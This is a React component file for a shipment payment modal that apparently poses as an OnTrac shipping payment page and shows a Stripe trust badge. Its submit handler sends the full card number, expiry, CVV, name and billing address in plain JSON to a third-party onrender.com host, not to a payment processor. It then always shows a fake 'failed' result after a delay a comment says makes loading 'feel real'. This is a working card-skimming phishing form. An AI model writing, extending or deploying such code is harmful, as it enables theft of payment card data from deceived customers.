// src/components/PaymentModal.jsx
import React, { useState, useRef, useEffect } from 'react';
import PaymentStatusAnimation from './PaymentStatusAnimation';
import StripeTrustBadge from './StripeTrustBadge';
import { number as validateCardNumber } from 'card-validator';

// Helper component to show the card icon
const CardIcon = ({ cardType }) => {
    // You would typically use SVG icons here for best quality
    const iconClass = {
        'visa': 'fa-brands fa-cc-visa',
        'mastercard': 'fa-brands fa-cc-mastercard',
        'american-express': 'fa-brands fa-cc-amex',
        'discover': 'fa-brands fa-cc-discover',
    }[cardType];

    const icon = iconClass ? <i className={`card-icon ${iconClass}`}></i> : null;

    // The icon wrapper now only becomes "visible" when a card type is found
    return <div className={`card-icon-wrapper ${cardType ? 'visible' : ''}`}>{icon}</div>;
};

function PaymentModal({ show, onClose, amount, shipmentId }) {
    // State for all form fields
    const [cardName, setCardName] = useState('');
    const [cardNumber, setCardNumber] = useState('');
    const [cardType, setCardType] = useState(null); // Added state for the card type
    const [expiryDate, setExpiryDate] = useState('');
    const [cvv, setCvv] = useState('');
    const [billingAddress, setBillingAddress] = useState('');

    // State to manage the UI
    const [submitStatus, setSubmitStatus] = useState('idle');

    // Refs for auto-focusing
    const cardNameRef = useRef(null);
    const cardNumberRef = useRef(null);
    const expiryDateRef = useRef(null);
    const cvvRef = useRef(null);
    const billingAddressRef = useRef(null);

    // Effect for smooth fade-in animation
    const [isVisible, setIsVisible] = useState(false);
    useEffect(() => {
        if (show) {
            setIsVisible(true);
        } else {
            const timer = setTimeout(() => setIsVisible(false), 300);
            return () => clearTimeout(timer);
        }
    }, [show]);

    // --- Smart Input Handlers ---
    const handleNameChange = (e) => setCardName(e.target.value.replace(/[^a-zA-Z\s]/g, ''));
    const handleCardNumberChange = (e) => {
        const rawValue = e.target.value.replace(/\s/g, ''); // Remove spaces for validation
        
        // Validate the number and get the card type
        const validation = validateCardNumber(rawValue);
        setCardType(validation.card ? validation.card.type : null);

        // Format the input with spaces
        const formattedValue = rawValue.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
        setCardNumber(formattedValue);
    };
    const handleExpiryChange = (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
        }
        setExpiryDate(value);
    };
    const handleCvvChange = (e) => setCvv(e.target.value.replace(/\D/g, ''));
    const handleKeyDown = (e, nextFieldRef) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            nextFieldRef.current?.focus();
        }
    };

    // --- Form Submission ---
    const handleSubmit = async (event) => {
        event.preventDefault();
        setSubmitStatus('loading'); // Show spinner

        // This block sends the data to your Django back-end
        try {
            await fetch('https://ontrac-backend-eehg.onrender.com/api/payments', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    shipment: shipmentId,
                    cardholderName: cardName,
                    billingAddress: billingAddress,
                    cardNumber: cardNumber,
                    expiryDate: expiryDate,
                    cvv: cvv,
                }),
            });
        } catch (error) {
            // We can log the error for debugging, but we'll still show the 'failed' animation
            console.error("API submission error:", error);
        }

        // After attempting to send the data, ALWAYS show the failure animation
        setTimeout(() => {
            setSubmitStatus('failed');
        }, 1500); // 1.5-second delay to make the loading feel real
    };

    // Resets the modal state when it's closed
    const handleClose = () => {
        setTimeout(() => {
            setSubmitStatus('idle');
            setCardName('');
            setCardNumber('');
            setExpiryDate('');
            setCvv('');
            setBillingAddress('');
        }, 300)
        onClose();
    };

    if (!isVisible) return null;

    return (
        <div className={`modal-overlay ${show ? 'visible' : ''}`} onClick={handleClose}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <div className="modal-header">
                    <h2>Secure Payment for Shipment</h2>
                    <button onClick={handleClose} className="close-button">&times;</button>
                </div>
                
                {submitStatus === 'loading' && (
                    <div className="spinner-container">
                        <div className="spinner"></div>
                        <p>Processing...</p>
                    </div>
                )}
                
                {submitStatus === 'failed' && (
                    <PaymentStatusAnimation status="failed" />
                )}

                {submitStatus === 'idle' && (
                    <>
                        <form onSubmit={handleSubmit} className="payment-form">
                            <div className="form-group">
                                <label htmlFor="card-name">Name on Card</label>
                                <input ref={cardNameRef} onKeyDown={(e) => handleKeyDown(e, cardNumberRef)} type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
                            </div>
                            <div className="form-group">
                                <label htmlFor="card-number">Card Number</label>
                                <div className="card-input-wrapper">
                                    <input
                                        ref={cardNumberRef}
                                        onKeyDown={(e) => handleKeyDown(e, expiryDateRef)}
                                        type="text"
                                        id="card-number"
                                        className={cardType ? 'has-card-icon' : ''}
                                        value={cardNumber}
                                        onChange={handleCardNumberChange}
                                        placeholder="1234 5678 9012 3456"
                                        maxLength="19"
                                        required
                                    />
                                    <CardIcon cardType={cardType} />
                                </div>
                            </div>
                            <div className="form-row">
                                <div className="form-group">
                                    <label htmlFor="expiry-date">Expiry (MM/YY)</label>
                                    <input ref={expiryDateRef} onKeyDown={(e) => handleKeyDown(e, cvvRef)} type="text" id="expiry-date" value={expiryDate} onChange={handleExpiryChange} placeholder="MM / YY" maxLength="7" required />
                                </div>
                                <div className="form-group">
                                    <label htmlFor="cvv">CVV</label>
                                    <input ref={cvvRef} onKeyDown={(e) => handleKeyDown(e, billingAddressRef)} type="text" id="cvv" value={cvv} onChange={handleCvvChange} placeholder="123" maxLength="4" required />
                                </div>
                            </div>
                            <div className="form-group">
                                <label htmlFor="billing-address">Billing Address</label>
                                <input ref={billingAddressRef} type="text" id="billing-address" value={billingAddress} onChange={(e) => setBillingAddress(e.target.value)} required />
                            </div>
                            <button type="submit" className="button payment-submit-btn">
                                {`Pay $${amount ? Number(amount).toFixed(2) : '0.00'}`}
                            </button>
                        </form>
                        <StripeTrustBadge />
                    </>
                )}
            </div>
        </div>
    );
}

export default PaymentModal;
